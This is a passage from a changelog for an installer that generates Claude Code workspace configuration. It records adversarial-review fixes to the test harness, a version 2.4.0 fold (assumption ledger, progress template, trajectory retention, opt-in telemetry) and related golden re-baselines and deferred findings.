    surface (tier-2/3 escalation, hard block, audio dispatch,
    duration/file-read triggers) is recorded as backlog **I-1**; the absent
    agent-side autonomous cooperation contract (CLAUDE.md addenda,
    implementer variants, greenfield spec-decompose classifiers) as
    **I-2**. See `docs/deferred-backlog.md` cluster I for the review's full
    deferred set (I-1 … I-14) and README "Honest limitations" for the
    operator-facing statement.
- **Release mechanics.** README gains a v2.5.0 section and the consumer pin
  target (the annotated `v2.5.0` tag — the repo's first); the changelog
  tripwire chain in `test_ic_gate` extends to 2.5.0; the UI/UX guide
  masthead now names v2.5.0 alignment (superseding the earlier
  keep-at-v2.4.0 call, which predated the tag decision).

## Test harness & isolation (PR #9) — adversarial-review fixes

Multi-lens adversarial review of PR #9 (7 finder lenses → 3 refutation-seeking
verifiers per finding → completeness sweep, 62 agents). 13 findings survived
verification, collapsing to six distinct defects — all fixed here. No emitted
artifact or golden fixture changed; test surface 945 → 946 checks.

- **Tree-pollution check was blind to the leak it exists for.** `bin/run-tests`
  snapshotted `git status --porcelain` with no `--ignored`, so a suite writing
  into `.claude/logs/hooks.log` (gitignored — the *motivating* regression) was
  invisible: the runner printed `ALL SUITES PASSED` while the repo was written
  into. Now `--ignored --untracked-files=all`; suites run with
  `PYTHONDONTWRITEBYTECODE=1` so honest bytecode caching does not trip the
  now-ignored-aware check. Verified by reproduction: reverting the `_run_hook`
  pin and running the installer suite now exits 1 on `!! .claude/logs/hooks.log`.
- **Silent skip on a None snapshot.** `tree_state()` returns None when git is
  unavailable / not a checkout; both call sites skipped the check wordlessly,
  rc untouched — a run where the net was never strung looked identical to a
  verified-clean one (against fail-loud-not-silent). Now reported LOUDLY as
  "WORKING-TREE CHECK SKIPPED"; `--no-tree-check` remains the quiet opt-out.
- **Set-difference missed destructive changes to already-dirty files.** Keys
  stripped the status code and the diff was one-directional (`after - before`),
  so deleting or reverting a file that was already dirty at start cancelled out.
  Now keys keep the status code and the comparison is symmetric.
- **Untracked-directory collapsing.** A file written into a pre-existing
  untracked dir hid behind a single `?? dir/` entry; `--untracked-files=all`
  now enumerates it.
- **CI lost its log affordances.** The move to `run: bin/run-tests` dropped the
  inline loop's `::group::` folding and `::error` annotations, and streamed 945
  checks flat. The runner now re-emits both under `GITHUB_ACTIONS`, and flushes
  stdout before the stderr diagnostics so the merged CI log is ordered.
- **T2.FS7b was a vacuous tripwire** (`tests/test_retrofit.py`, pre-existing on
  main). It asserted only the absence of `retrofit_active exempt` from the log —
  tautologically true, because with no JSON parser the command is unparseable,
  the git-commit `case` never matches, and no exemption branch is reached.
  Rewritten to reuse AF2's exact exempting condition (retrofit_active=true +
  .claude/-only staged) and assert a parser outage does NOT silently grant it,
  plus a positive assertion on the inert `ok` fall-through (rules out the
  empty-log escape). Mutation-tested: injecting python3 back flips it to FAIL.
  Also added the missing `cwd=d` (the leak class 5f0bfd8 closed in `_run_hook`).

**Owner-facing posture note (NOT changed here):** under a *total* parser outage
(no jq AND no python3) the emitted git-commit gates match nothing and become an
inert pass-through — they neither exempt nor enforce. `secrets-gate` shares this
fail-open on an unparseable payload. Changing the emitted gates' fail posture is
a golden-changing RETROFIT-contract decision left to the owner; FS7b now locks
the observable "no silent exemption" guarantee rather than asserting a block.

## 2.2.0 → 2.4.0 (v2.4.0 code fold — GR2-EX / TEL-EX; bring code up to the frozen v2.4.0 docs)

Single code fold; **no intermediate 2.3.0 code release**. The v2.3.0 GR2
doc fold and the v2.4.0 TEL-01 doc fold were both doc-first and landed no
code, so the real code delta is `2.2.0 → 2.4.0 = GR2-01 + GR2-02 +
GR2-03a + TEL-01`. Freeze exception recorded in the README review history
(GR2-EX / TEL-EX, W-1 precedent class: a mandated-artifact omission that
defeats a documented protocol invariant). Landed as five sequenced
commits so each golden re-baseline stays legible. Frozen v2.4.0 docs
(`Bootstrap-Protocol-v2-4-0.md`, `Bootstrap-Protocol-Companion-v2-4-0.md`,
`telemetry.md`) committed at repo root as the frozen sources this fold
implements against (the emitted bodies cite them; RC-03-class doc-existence
check added). **Test surface:** 14 suites, 866 checks green from a pristine
run (`test_installer.py` 141 → 197, `test_interview.py` 66 → 73,
`test_ic_gate.py` 45 → 46, golden 6/6 re-baselined per step, the auto.sh
`exit_reason` enum untouched). Seam impact: none.

### Step 0 — Version identity (`2.2.0 → 2.4.0`)

- `PROTOCOL_VERSION` → `"2.4.0"` in `lib/installer.py` and
  `lib/templates.py`. `RETROFIT_PROTOCOL_VERSION` stays `"1.6.2"`;
  `RUNTIME_FLOOR` stays `"2.1.210"` (seam-owned, untouched per §8).
- `plugin/plugin.json` version + description bumped to v2.4.0 (release
  identity, precedent from the 2.2.0 bump).
- Version assertions updated to 2.4.0: `AC-A0-1..3` (`test_installer.py`),
  the `AC-9-5` mirrors (`test_ic_gate.py`), `AC-1-1/1-2` + corrupt-state
  (`test_gate_substrate.py`), and retrofit `8.3` (`test_retrofit.py`).
  New `test_ic_gate.py` tripwire asserts this changelog carries the
  `2.2.0 → 2.4.0` entry.

**FREEZE-EXCEPTION (golden re-baseline, step 0).** Per AC-A0-3 the
version rides emitted `_generatedBy` strings (`settings.json`, the
manifest), so **both golden fixtures' digests move at this step with
action counts unchanged**. Re-baselined `EXPECTED_DIGESTS` in
`tests/test_greenfield_golden.py`; `EXPECTED_ACTION_COUNTS` unchanged
(`default: 55`, `full_autonomous: 67`). Isolated into its own commit so
the stamp's byte movement does not entangle the four content deltas.

### Step 1 — GR2-03a assumption ledger (unconditional artifact)

- New `_assumption_ledger(cfg)` in `lib/templates.py` (registered as
  `"assumption_ledger"`), and an **unconditional** `build_plan` add of
  `.claude/steering/assumption-ledger.md` after `tools.md`. Lands in
  `.claude/steering/` (never gitignored) → committed by construction; **no
  gitignore edit**.
- Body is a faithful workspace rendering of the frozen `## Assumption
  Ledger` section (`Bootstrap-Protocol-v2-4-0.md`, anchor
  `#assumption-ledger`). The three drift-threshold numbers are
  **interpolated from `cfg["hooks"]`** (`drift_tool_call_threshold` /
  `drift_session_duration_minutes` / `drift_file_read_threshold`), not
  hardcoded — the drift-detector hook body reads the same keys, so the
  ledger can never become a stale second authority when an operator
  customizes the detector. Pure function of cfg (no timestamp/env);
  determinism proven by the digest test.
- **File count +1 on every fixture** (default 55→56, full_autonomous
  67→68). `test_installer.py` gains snapshot-based GR2-03a assertions
  (emitted-once, +1 delta, committed, interpolation real vs decorative,
  determinism); `test_greenfield_golden.py` re-baselined (both fixtures
  +1, digests moved, freeze-exception comment added).
- **DEFERRED (recorded, not shipped) — the GR2-03a *surfacing* behavior.**
  The frozen spec has two halves: the emitted artifact (shipped here) and
  a wizard behavior that "surfaces due entries on any pinned-model or
  runtime-floor change as a fail-loud, non-blocking notice." This fold
  delivers the **artifact only**. The surfacing is deferred with these
  **locked constraints**: it MUST be fail-loud and **non-blocking** (never
  blocks the model/runtime change); it MUST read the ledger's
  `Re-validation trigger` column and surface exactly the rows whose trigger
  matches the event; it MUST hang off the same event the v2.0.0 model
  remap / any later regenerate-config flow already represents (no new
  trigger surface); it MUST NOT silently proceed. Rationale: the emission
  is a pure `build_plan` artifact with zero runtime surface, whereas the
  surfacing is wizard-runtime logic wanting its own fixture and review;
  bundling would widen this fold's blast radius. The emitted ledger words
  the surfacing as protocol-specified with a "re-check by hand until it
  lands" note (honest framing — the operator doc must not claim unshipped
  behavior as current fact); when the surfacing ships, that one paragraph
  updates under the same freeze exception as the surfacing change.

### Step 2 — GR2-01 progress artifact (prose only, no new file)

`progress.md` is created at *task start* (when a slug exists), not at
install, so GR2-01 lands **no static file** and the plan count is
unchanged. Three prose edits in `lib/templates.py`:

- **`_claude_md`** reading list: read the task's
  `.claude/specs/<slug>/progress.md` (`Status` + `Failed approaches`)
  **first** at task/iteration priming, before the task brief, so a resumed
  session does not re-attempt a known dead end.
- **`_agents` implementer body**: consult the task's `progress.md` **Failed
  approaches** during priming (loop and goal-supervised modes) and never
  re-attempt a do-not-retry dead end. **The reviewer body is untouched** —
  it is the deterministic gate; loop-awareness there would conflate gate
  and iteration.
- **`_specs_index` (`.claude/specs/INDEX.md`)** — the single emitted home
  for the canonical `progress.md` reference template (Appendix B, with its
  corrected link targets `decisions.md` / `learnings/` /
  `sessions/<timestamp>-checkpoint.md`). Chosen over `/spec-new` because
  skills/commands are gated on `install_skills`/`install_commands` whereas
  INDEX.md is **unconditional**; the `_claude_md` note and implementer body
  LINK here rather than duplicating the template. Without this embedding
  GR2-01 would land the read-first prose with no emitted definition of the
  artifact's shape — the runtime creator would have to invent it, violating
  record-do-not-manufacture at runtime.
- **Commit-policy edit — no-op in code, recorded.** The PRD line-889
  committed-set enumeration lives only in the protocol document; **no
  emitted body carries a committed-set enumeration** (the only
  "operator-facing … committed" text in `lib/templates.py` is a Python
  source comment inside `_gitignore`, which is not emitted). `progress.md`
  is committed by construction because `.claude/specs/` is never
  gitignored. No new enumeration was invented to have something to edit.
- Count unchanged (56 / 68); golden re-baselined for the moved body bytes
  (freeze-exception). `test_installer.py` gains GR2-01 assertions
  (read-first note; implementer-has / reviewer-lacks the do-not-retry text;
  template section headers + three link targets present; template embedded
  in exactly one body).

### Step 3 — GR2-02 trajectory retention (comment-contract only, no new file)

Single edit surface: the shared `_per_task_wrapper(kind)` builder in
`lib/templates.py`, which covers **both** `loop.sh` and `goal-loop.sh`
(`_loop_sh` / `_goal_loop_sh` still only delegate). **`auto.sh` is not a
GR2-02 target** — it is the separate queue runner, not the
operator-completed loop; its `exit_reason` enum is untouched and adds no
value.

- **Fourth binding item** added to the wrapper's dispatch/deliverable
  comment block (beside the `--output-format stream-json --verbose`
  documentation): the operator-completed loop MUST retain each iteration's
  stream JSON at `.claude/logs/trajectory-<task-id>-<iter-n>.jsonl`
  (already gitignored under the existing `.claude/logs/` `logs/` rule — no
  gitignore change — and purged with the 7-day state policy). A skeleton
  self-check that finds retention disabled MUST **fail loud**.
- **`Trajectory` line** added to the documented `loop-final-<task-id>.md`
  structure block, linking the retained `.claude/logs/trajectory-*` files.
- **The "OTel span export is optional" sentence is PRD framing, not
  required emitted text** — the normative MUST-enumerate list (PRD line
  1098) is items (1)–(4); the OTel-optional sentence is document framing
  and is deliberately **not** added to the emitted comment (recorded so a
  later review does not read the omission as a miss).
- Count unchanged; **only the full_autonomous fixture's digest moves**
  (`loop.sh` + `goal-loop.sh`); the default fixture has no wrappers so its
  digest is untouched at this step. `test_installer.py` gains GR2-02
  assertions (retention path literal; fail-loud self-check; the loop-final
  `Trajectory:` line asserted *within* the structure block; loop.sh did not
  gain the judge-parity clause). `test_usage_limit_contract.py`'s
  auto.sh 13-value enum assertion stays green untouched.

### Step 4 — TEL-01 telemetry doc (opt-in, flag-gated)

- **`_telemetry(cfg)`** in `lib/templates.py` (registered `"telemetry"`)
  returns the **frozen `telemetry.md` body verbatim**. Exactly two values
  are stamped at emission, **scoped to the `OTEL_RESOURCE_ATTRIBUTES`
  line**: `<protocol_version>` ← `PROTOCOL_VERSION`, `<archetype>` ←
  `cfg["project"]["archetype"]`. The explanatory comment two lines above
  legitimately keeps the literal placeholder names, so the substitution is
  a scoped one-line build, not a global replace (AR-01 class). Fails loud
  (raises) if either value is missing — never emits a body whose OTEL line
  still carries a `<placeholder>`. Emitted body verified byte-identical to
  the uploaded `telemetry.md` (modulo the two substitutions).
- **`build_plan`** flag-gated add of `.claude/steering/telemetry.md` when
  `cfg.get("telemetry_export_enabled")`. Committed by construction
  (steering never gitignored); no gitignore edit. Read defensively.
- **`_write_state`** persists `telemetry_export_enabled` cfg-authoritatively
  (mirrors the mode-flag pattern); the flag-gated add and the state field
  key off the same cfg value, so emitted doc and state never disagree.
- **TAR-01 substitution-source deviation (recorded).** The frozen head
  note / Companion / body comment say the version is stamped "from
  `.bootstrap-state.json` (`bootstrap_protocol_version`)"; this
  implementation stamps the `PROTOCOL_VERSION` **constant**. Code-verified
  equivalent: both state writers stamp `bootstrap_protocol_version =
  PROTOCOL_VERSION` (`_write_state` and `_write_retrofit_state`), and
  `apply_plan` refreshes an unmodified `telemetry.md` on re-apply/upgrade
  (hand-edits preserved under L-1, the expected exception) — so the emitted
  constant equals the state-written value on every apply path. The
  regression lock is the TAR-01 pairing assertion (emitted OTEL version ==
  state `bootstrap_protocol_version` on the same apply).
- **Wizard wiring — `lib/interview.py`** [freeze exception]. TEL-01 is a
  skippable Phase 0 decision, wired as a **standalone top-level boolean**
  (NOT under `autonomous_modes` — telemetry is independent of every
  autonomous mode): added to `ANSWER_KEYS`, `default_answers` (default
  skip), `answers_to_config` (top-level key), `parse_interview_answers`
  `bool_keys`, the deterministic render (verbatim PRD "Enable observability
  export?" question), and the interactive front-end prompt. Back-compat: a
  pre-2.4.0 ANSWERS block lacking the line parses to `false` rather than
  erroring. Phase 0.5 preview needs no interview edit — the dry-run plan
  listing already includes `telemetry.md` once the flag-gated add lands.
- **Config flag — no `defaults.py` freeze exception.** `resolve_config`
  deep-copies `raw`, so the unknown top-level `telemetry_export_enabled`
  key passes through on both greenfield and retrofit; the retrofit branch
  rejects only the three nested `*_enabled` mode flags. Verified by the
  retrofit-passthrough assertion. (The retrofit **state schema** is not
  extended — out of scope, recorded; the flag-gated add still emits
  `telemetry.md` on a retrofit plan because the overlay wraps the full
  plan.)
- **Off by default = invisible.** Default plan count and determinism digest
  unchanged vs the post-GR2-03a baseline; **no golden move** (neither
  golden fixture opts in — the on-path is covered only in
  `test_installer.py`). On-path: +1 file, committed, substituted OTEL line.
  New assertions in `test_installer.py` (off/on/committed/OTEL-scoped/
  pairing/TAR-02-secrets/state-flag/retrofit-passthrough) and
  `test_interview.py` (default false, verbatim question, yes→true
  round-trip).

### Step 6 — Adversarial code review of the fold: correctness fixes

Multi-lens adversarial review of the open PR (10 finder angles, one
refutation-seeking verifier per candidate, plus a gap sweep). Fixes land
in the same PR, grouped by surface. This step is the **non-frozen `lib/`
correctness set**; the frozen-source corrections and the remaining
test/release-integrity items follow in steps 7 and 8.

- **TEL-01 flag normalization (opt-out inversion).** `minyaml` coerces
  only bare `true`/`false`, and `resolve_config` (frozen `defaults.py`)
  neither knows nor validates the post-schema `telemetry_export_enabled`
  key — so `off`, `no`, `"false"` all arrived as **non-empty strings** and
  raw truthiness read them as ENABLED, emitting `telemetry.md` and
  stamping `telemetry_export_enabled: true` into state. An explicit
  privacy opt-out silently inverted into an opt-in. New
  `installer.telemetry_enabled(cfg)` resolves the accepted spellings
  (bool, `0`/`1` int, and the string forms) and **fails loud** on anything
  unrecognized rather than guessing; both consumers (the `build_plan` gate
  and the `_write_state` stamp) route through it, so the emitted doc and
  the persisted flag cannot disagree. Only the wizard normalized before;
  the documented hand-edit-the-config path had no guard.
- **Upgrade-path overwrite protection.** `apply_plan`'s hand-edit guard
  only fired for **manifest-tracked** paths: `prev_files.get(path)` is
  `None` for a path the installer has never written, so the guard fell
  through and overwrote it. That is precisely the `2.2.0 → 2.4.0` upgrade
  — GR2-03a and TEL-01 both ADD planned paths, and the doc-first v2.3.0
  migration note tells operators to hand-create `assumption-ledger.md`.
  Reproduced end-to-end: a hand-seeded ledger was replaced with no
  warning and no backup, contradicting the promise the emitted ledger's
  own header makes. An untracked file at a planned path is now treated as
  operator-owned and skipped (`pre-existing and not installer-generated`),
  `--force` unchanged. Same fix closes a second-order gap: a skip records
  the OPERATOR's digest, which on the next run read as "we wrote that" and
  fell through to overwrite — protecting an edit exactly once and
  clobbering it on the following run. Ownership is now sticky via the
  `skipped-local-edit` state marker (a revert to our bytes classifies
  `unchanged` and never reaches the guard).
- **Fail-loud back-compat discriminator (TEL-01 parse).** The missing-key
  exemption keyed only on the key NAME, so a **deleted or misspelled**
  telemetry line in a freshly rendered v2.4.0 file resolved silently to
  `false` — the operator believes the export is on, no `telemetry.md` is
  emitted, and nothing says why (unknown keys are dropped without a
  warning). `render_interview` emits the telemetry SECTION
  unconditionally, so its presence dates a file to v2.4.0-or-later: marker
  present ⇒ raise, marker absent ⇒ genuinely pre-2.4.0, keep defaulting to
  skip. The locked back-compat requirement is preserved and
  fail-loud-not-silent is restored on the designed hand-edit surface. The
  title is now a shared constant (`TELEMETRY_SECTION_TITLE`) referenced by
  both the renderer and the parser so the two cannot drift.
- **Emitted comment-contract citations (GR2-02 wrappers).** Three
  corrections in the shared `_per_task_wrapper` skeleton, all
  string-asserted normative surface: (a) the trajectory-retention item
  interpolated `{phase}`, making `goal-loop.sh` cite a *Phase 9.6
  "Deliverable contract for the wrappers"* heading that does not exist —
  now cites Phase 9.5 unconditionally, the contract's single normative
  home (Phase 9.6 references rather than restates it); (b) the loop-final
  block hardcoded **Phase 9.7**, which is queue mode — a phase a loop-only
  project never enabled, and not where `loop-final` is defined — now
  interpolates `{phase}` (9.5/9.6) like its sibling; (c) the block named
  `.claude/specs/` while never stating the actual destination, now names
  `.claude/sessions/loop-final-$TASK_ID.md` and states the gitignore
  posture accurately (only the `.claude/sessions/` DOTFILE sentinels are
  ignored). `auto.sh` untouched; its 13-value `exit_reason` enum unchanged.
- **Assumption-ledger source-of-truth pointers.** `§6.D` → `§6.E`: §6.D is
  the *Hook security & correctness checklist*; the drift thresholds live
  under §6.E (*Audio alert system* → *Drift detector specifics*). Verified
  against the frozen doc's own section map, and against the pre-existing
  emitted bodies that correctly cite 6.D for the security checklist. The
  max-iterations pointer to `.claude/loop-config.md` is now phrased
  conditionally — that file is emitted only under loop mode, so the
  UNCONDITIONAL ledger was sending a default install to a path absent
  from its own tree.
- **`progress.md` template cross-references.** The canonical template
  embedded in every emitted `.claude/specs/INDEX.md` carried `PRD lines
  806/1168` and `PRD Phase 7 step 6, §6.D` — coordinates into the Bootstrap
  protocol document. In an emitted project "PRD" denotes the operator's own
  product doc (`project.prd_path`) and the protocol doc is not shipped, so
  every instantiated `progress.md` pointed agents at the wrong file (and
  raw line numbers rot on the next doc edit). Replaced with self-contained
  descriptions of the same conventions.

**FREEZE-EXCEPTION (golden re-baseline, step 6).** Both fixtures move;
zero files added or removed; counts stable (`default: 56`,
`full_autonomous: 68`). Diff-verified vs the pre-fix head before
`GOLDEN_UPDATE=1` — default: `assumption-ledger.md` + `specs/INDEX.md`;
full_autonomous: those two plus `loop.sh` / `goal-loop.sh`. Recorded in
the golden-file comment alongside the digests.

**Freeze-exception accounting correction.** The step-2 (GR2-01)
default-fixture record enumerated two body movers (`CLAUDE.md`,
`specs/INDEX.md`) where a main-vs-branch plan diff shows **three** — the
implementer agent body is added unconditionally in `_agents`, so it moves
in BOTH fixtures, not only `full_autonomous`. The aggregate digest was
therefore absorbing a byte change the record never named, which is exactly
what the tripwire's audit trail exists to prevent. Comment corrected;
independently re-verified by diffing per-path bodies across `main` and the
branch.

**Test surface:** 14 suites, 914 checks green (`test_installer.py`
197 → 237, `test_interview.py` 73 → 81). New coverage: flag normalization
across every accepted spelling plus fail-loud rejection of unrecognized
values, the state-stamp pairing on a non-canonical spelling, the
untracked-path skip (including stickiness across runs and `--force`
override), and the parse discriminator (deleted key, misspelled key,
genuine pre-2.4.0 file, and other keys staying loud). Emitted wrappers
still pass `bash -n` with telemetry on; re-apply idempotent
(`create=0 update=0`); `--ic-checks` exit 0.

### Step 7 — Review fixes in the frozen sources (pre-release corrections)

Three review findings originate in the **frozen sources this fold
implements against**, not in the code that renders them: the code
faithfully reproduces text that is itself wrong. Because
`Bootstrap-Protocol-v2-4-0.md`, the Companion, and `telemetry.md` are
added by this PR and it has not merged, these are **pre-release
corrections** on the TAR-02..06 precedent (that class edited
`telemetry.md` eight times while it was "free pre-freeze"), not
freeze exceptions against a released artifact. Each correction is applied
to the frozen source AND the emitted copy in the same commit, so the two
stay byte-equivalent modulo the one substituted line.

- **`settings.local.json` was not actually gitignored (credential
  vector).** The emitted `telemetry.md` steers OTLP endpoint and
  **auth-header** settings into `.claude/settings.local.json` and calls
  that file "(gitignored)" — while none of the three emitted gitignore
  surfaces (`_gitignore`, `_gitignore_root`, `_retrofit_gitignore`)
  covered it. Claude Code auto-ignores that file only when Claude Code
  *itself* creates it, and the doc explicitly says to set these values
  **before launching `claude`** — so in a fresh bootstrap the operator
  hand-creates it, and `git add .claude` stages
  `OTEL_EXPORTER_OTLP_HEADERS` tokens. The same paragraph concedes
  "nothing in the pipeline scans it for a pasted secret," so no downstream
  gate catches it either. **Fixed by making the claim true** (one entry in
  the greenfield fragment, one in the retrofit fragment) rather than by
  softening the doc — verified end-to-end: `git add -A` on a project with
  a hand-written token file now stages nothing, `git check-ignore`
  confirms the rule.
- **`telemetry.md` restated drift thresholds as `(50/120/3)`.** The
  assumption ledger interpolates those three values from `cfg["hooks"]`
  *specifically so no emitted doc becomes a stale second authority* — yet
  the co-emitted `telemetry.md` hardcoded them, so on any customized
  config the two steering docs in the same directory disagreed about the
  project's own configuration (reproduced with
  `drift_tool_call_threshold: 77`: ledger says 77, telemetry said 50), and
  the ledger cross-links `telemetry.md` as its evidence source. Rather
  than add a third scoped substitution, the row now **drops the numbers
  and points at the ledger** — the contradiction class is removed instead
  of duplicated, consistent with the ledger's own "this ledger links, it
  does not restate" rule.
- **The trajectory 7-day purge was asserted but never implemented.** The
  GR2-02 contract and `telemetry.md` both stated retained
  `trajectory-*.jsonl` files "are purged with the 7-day state-retention
  policy". That policy covers session-ID-namespaced state under
  `.claude/sessions/`; it does not reach `.claude/logs/`, and **no emitted
  hook, wrapper, or `auto.sh` consumes `purge_old_state_after_days`** —
  nothing prunes trajectory files at all. Since the same contract makes
  retention *mandatory*, the files accumulate without bound across an
  unattended campaign while the committed doc told a privacy reviewer they
  expire. Corrected to state pruning as part of the operator obligation
  the contract already binds, in the wrapper comment, `telemetry.md`, the
  protocol's Phase 9.5 item 4, and the Companion's artifact table and
  migration note. **Deliberately not "fixed" by adding a purge:**
  automatic file deletion in an emitted script is new destructive
  behavior and an owner decision, not a review-fix. Implementing a real
  prune remains available as a follow-up.
- **`§6.D` → `§6.E` in the doc text too.** Step 6 corrected the emitted
  ledger's citation; the same wrong letter appears in the v2.3.0 fold's
  own doc text (the changelog note's "cross-reference pointers added at
  §6.D", the Assumption Ledger section's links sentence, and the GR-2
  appendix's "§6.D, Alert 3"). All three corrected. The pre-existing §6.D
  references at Phase 6.D / "documented in section 6.D" are **unchanged
  and out of scope** — verified present in `v2-0-0` and `v2-2-0`, so they
  belong to the already-recorded doc-reference-normalization deferral.
- **Literal `\uXXXX` escapes in the GR-2 appendix (found while fixing the
  above, not in the review).** Lines 1967–2003 of the protocol doc — the
  block the v2.3.0 fold added — carried 34 undecoded escapes (23
  `—`, 9 `§`, plus `…`/`≥`) that render literally as
  backslash-u text. Decoded in place; confined to that block, zero
  elsewhere in the doc, zero in the Companion and `telemetry.md`.

**FREEZE-EXCEPTION (golden re-baseline, step 7).** Both fixtures move;
zero files added/removed; counts stable (56 / 68). Diff-verified before
`GOLDEN_UPDATE=1`: default — `.claude/.gitignore` only; full_autonomous —
that plus `loop.sh` / `goal-loop.sh` (purge wording). `telemetry.md` is in
**neither** fixture (both leave the flag off), so its threshold and purge
corrections produce no golden movement and the "off by default =
invisible" property still holds; those are covered behaviorally instead.

**Test surface:** 14 suites, 928 checks green (`test_installer.py`
237 → 251). New coverage: the gitignore entry on both greenfield and
retrofit fragments, the absence of restated thresholds paired with the
ledger still carrying the customized value, the purge-claim wording, and
a **frozen-source equivalence pin** — the emitted body must match
`telemetry.md` line-for-line with exactly one differing line, and that
line must be the `OTEL_RESOURCE_ATTRIBUTES` export. That last check closes
the gap that made these corrections risky: the two ~80-line copies were
byte-verified once by hand at fold time and pinned by nothing, so a future
edit to either could silently strand the other (no golden covers it,
since both fixtures leave the flag off).

### Step 8 — Review fixes: retrofit coherence, release identity, test quality

- **GR2 artifacts reached retrofit with no consumer.** The overlay wraps
  the full greenfield plan, so a retrofit install already receives the
  unconditional `.claude/specs/INDEX.md` (carrying the canonical
  `progress.md` template) and `assumption-ledger.md`, plus — on opt-in —
  wrappers carrying the GR2-02 trajectory contract. But the overlay
  **replaces** `CLAUDE.md` and `implementer.md` with retrofit-flavor
  bodies, and those received none of the GR2-01 read-progress-first
  prose. The artifacts shipped with nothing instructing an agent to
  consume them, so a resumed unattended retrofit iteration could
  re-attempt an approach flagged do-not-retry — the exact failure GR2-01
  exists to prevent. Restored in both retrofit bodies, **scoped to the
  `*_opted_in` sections**: that is the only configuration in which a
  resumed autonomous session exists, so the default retrofit surface on
  this 1.6.2-pinned track stays byte-unchanged (asserted, 10.17/10.18).
  *Alternative considered:* dropping the GR2 artifacts from retrofit
  plans entirely, by the overlay's own `sdk_gates` rationale ("an artifact
  the retrofit contract never declared"). Rejected because `RETROFIT.md`
  **does** declare the `specs/INDEX.md` structure the template lives in,
  and the ledger's rows are operationally applicable (retrofit ships the
  drift-detector hook and, on opt-in, `loop-config.md`). Widening the
  instruction to unconditional, or dropping the artifacts, both remain
  easy reversals from here.
- **Retrofit GR2 coverage, previously zero.** `test_retrofit.py` had no
  assertion about any GR2 artifact. Eight added (10.13–10.20): the
  template ships, both opted-in instruction surfaces carry it, the
  trajectory contract rides the retrofit wrappers, the default body stays
  clean, the ledger lands, and the retrofit gitignore carries the TEL-01
  `settings.local.json` entry.
- **`plugin.json` version is now pinned.** It was the one release-identity
  surface no test read, and it has been missed **twice**: v2.0.0 shipped
  `"1.0.0"` (corrected later by a review item) and the v2.2.0 bump omitted
  it again (caught only in adversarial review). Both misses happened even
  though the changelog records `plugin.json` as part of the release set —
  the convention was never the control. Now asserted against
  `PROTOCOL_VERSION`, including the version in its description prose. Also
  pinned: `installer.PROTOCOL_VERSION == templates.PROTOCOL_VERSION`, so a
  half-applied bump fails rather than emitting bodies stamped with one
  version while state records the other.
- **Removed a tautological check.** The GR2-03a "plan count is +1 for the
  ledger" check filtered the ledger out of the same plan and compared
  lengths — a partition of one list by complementary predicates, so the
  delta equalled the occurrence count by construction and could never fail
  independently of the check above it. Its comment advertised a "+1 vs the
  v2.2.0 plan" comparison that was never built. Deleted, with a note
  pointing at `EXPECTED_ACTION_COUNTS` (56 / 68), which is where a real
  count regression actually surfaces.

**No golden movement from the items above** — the retrofit change touches
only retrofit-flavor bodies (neither golden fixture is retrofit) and the
rest is test-only.

- **GR2-01 template ownership (the upgrade-delivery half).** Step 6 stopped
  the upgrade from *destroying* operator content; this closes the other
  half of the same finding. The canonical `progress.md` template was
  emitted **inside `.claude/specs/INDEX.md`** — the spec roster, which
  Phase 7.6 step 5 explicitly directs operators to rewrite. So on any real
  install the hand-edit guard correctly SKIPS that file, and the template
  could never reach an upgraded workspace, while `CLAUDE.md` and the
  implementer body *were* updated to point at a section that would never
  arrive (a dangling pointer). Delivering it required `--force`, which
  destroys the roster. Root cause is altitude, not logic: installer-owned
  normative content was parked in operator territory. The template now
  lives in its **own installer-owned file**,
  `.claude/specs/progress-template.md`, which nobody hand-edits and which
  therefore updates cleanly forever; `INDEX.md` keeps the roster and
  points at it. All four pointers (greenfield `CLAUDE.md` + implementer,
  and both retrofit bodies) re-aimed. The original rationale for choosing
  INDEX.md was that it is *unconditional* — a new unconditional file
  satisfies that equally, without the ownership collision. Verified
  end-to-end on a real `2.2.0 → 2.4.0` upgrade: roster intact,
  hand-seeded ledger intact, `CREATE .claude/specs/progress-template.md`,
  and the `CLAUDE.md` pointer resolving to a file that exists.

**FREEZE-EXCEPTION (golden re-baseline, step 8) — first count change of
the review.** `default: 56 → 57`, `full_autonomous: 68 → 69`. One file
added, zero removed, three bodies moved (`INDEX.md` loses the template
body and gains a pointer; `CLAUDE.md` and `implementer.md` re-aim theirs).
Diff-verified before `GOLDEN_UPDATE=1`; recorded in the golden comment.

**Test surface:** 14 suites, **945 checks** green, up from 866 at the
start of the review (`test_installer.py` 197 → 260, `test_interview.py`
73 → 81, `test_retrofit.py` 254 → 262).

### Review findings recorded but NOT fixed

Below the reported cap or deliberately deferred, listed so a later pass
does not re-derive them: the recorded retrofit **state-schema** gap for
the telemetry flag (unchanged from step 4 — retrofit plans still emit
`telemetry.md` without a state field to match); the emitted progress
template's `../../learnings/` link, which resolves to `.claude/learnings/`
while a retrofit plan's calibration ledger sits at repo-root `learnings/`
(pre-existing placement, symmetric with greenfield, where neither mode
creates the directory at install time); the duplicated ~110-word telemetry
question text in `render_interview` and `run_interactive`, which has
already drifted in formatting and is pinned by a test in only one copy;
the `_body_of` helper defined *after* its would-be call sites, leaving two
bare-`IndexError` lookups; two determinism checks strictly implied by the
existing whole-plan digest check; the dead `not pv` arm in `_telemetry`'s
guard (`PROTOCOL_VERSION` is a module literal); a redundant proposal
rebuild in `test_interview.py`; the assumption ledger's drift row citing
the drift-detector hook config even when `hooks.drift_detector: false`
(untested configuration); and the freeze-exception ledger numbering, which
runs `no. 6`–`no. 15` and is not continued by the v2.4.0 blocks — the
recorded convention fixes the *format* (`no. N`, never `#N`) but not
sequential numbering, and these blocks carry the citable `GR2-EX / TEL-EX`
identity instead.

## 1.9.0 → 2.0.0 (Milestone A — doc-conformant; `gate_substrate` stays `"shell"`)

**Spec:** `.claude/specs/bootstrap-v2/requirements.md` rev-3 (owner-confirmed
2026-07-17). Milestone A implements R-0..R-6 (IC-1, IC-2, IC-3, IC-4, IC-7 +
the version identity and the model-remap assertion). The SDK substrate
(IC-5), native worktree routing (IC-6), and the IC gate ship as protocol
**2.1.0** in Milestone B [SR-04] — never under 2.0.0.

### R-0 — Version identity

- `PROTOCOL_VERSION` → `"2.0.0"` (`lib/installer.py`, `lib/templates.py`).
  `RETROFIT_PROTOCOL_VERSION` stays `"1.6.2"` (retrofit track untouched).
- Cross-references to the renamed protocol documents updated across `lib/`,
  `bin/`, `plugin/`, `tests/`, `README.md`
  (`BOOTSTRAP.md` → `Bootstrap-Protocol-v2-0-0.md`,
